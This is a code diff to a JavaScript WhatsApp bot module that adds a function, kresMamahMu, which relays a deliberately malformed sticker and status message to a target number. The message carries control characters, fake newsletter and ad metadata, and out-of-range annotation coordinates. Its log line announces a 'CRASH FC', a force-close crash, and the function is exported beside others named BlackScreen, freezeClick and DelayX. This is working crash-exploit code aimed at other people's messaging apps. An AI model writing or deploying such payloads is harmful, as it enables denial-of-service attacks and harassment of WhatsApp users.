@@ -1333,6 +1333,92 @@ async function DelayX(sock, target) {
   }
 }
 
+async function kresMamahMu(sock, target) {
+  try {
+    if (!sock || sock.ws.readyState !== 1) return;
+
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: {
+          stickerMessage: {
+            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+            mimetype: "image/webp",
+            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+            fileLength: "10610",
+            mediaKeyTimestamp: "1775044724",
+            stickerSentTs: "1775044724091"
+          }
+        },
+        header: {
+          hasMediaAttachment: true,
+          jpegThumbnail: null,
+          title: "\x10"
+        },
+        forwardedNewsletterMessageInfo: {
+          newsletterJid: "1@g.us",
+          serverMessageId: 1,
+          newsletterName: "+",
+          contentType: "UPDATE",
+          accessibilityText: "×"
+        },
+        contextInfo: {
+          forwardingScore: 555,
+          isForwarded: true,
+          quotedAd: {
+            advertiserName: "👾",
+            caption: "\u0003"
+          },
+          placeholderKey: {
+            remoteJid: "1750291478@broadcast",
+            fromMe: false,
+            id: "ABCDEF1234567890"
+          },
+          externalAdReply: {
+            showAdAttribution: false,
+            renderLargerThumbnail: false,
+            title: 's3s',
+            body: "🫀",
+            previewType: "VIDEO",
+            mediaType: "VIDEO",
+            thumbnail: null,
+            sourceUrl: "kl@trash.lol",
+            mediaUrl: "kl@trash.lol",
+            sourceType: "¿?",
+            sourceId: "ABCDEF1234567890",
+            containsAutoReply: true,
+            ctwaClid: "ctwaClid",
+            ref: "ref"
+          },
+          annotations: [{
+            polygonVertices: [{
+              x: 25022008,
+              y: -25022008
+            }],
+            newsletter: {
+              newsletterJid: target,
+              newsletterName: "destroyer",
+              serverMessageId: 999,
+              contentType: "UPDATE",
+              accessibilityText: "#"
+            }
+          }]
+        }
+      }
+    }, {
+      participant: {
+        jid: target
+      }
+    });
+
+    logger.info(`[🚀] CRASH FC dikirim ke ${target}`);
+  } catch (err) {
+    logger.error(`[❌] Gagal kirim CRASH FC: ${err.message}`);
+  }
+}
+
 module.exports = {
   // Core State
   activeConnections,
@@ -1374,5 +1460,6 @@ module.exports = {
   CallLog,
   BlackScreen,
   freezeClick,
-  DelayX
+  DelayX,
+  kresMamahMu
 };
